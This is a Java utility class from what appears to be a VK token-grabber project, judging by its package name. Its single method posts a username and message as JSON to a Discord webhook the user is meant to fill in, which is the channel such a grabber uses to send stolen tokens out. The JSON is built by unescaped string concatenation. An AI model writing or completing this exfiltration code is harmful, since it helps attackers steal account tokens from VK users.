package com.github.dedinc.vktokengrabber.utils;

public class DiscordHook {

  public static void sendMessage(String username, String message) {
	  String hook = "YOUR HOOK HERE";
	  Request.post(hook, "{\"content\": \"" + message + "\", \"username\": \"" + username + "\"}");
  }
}
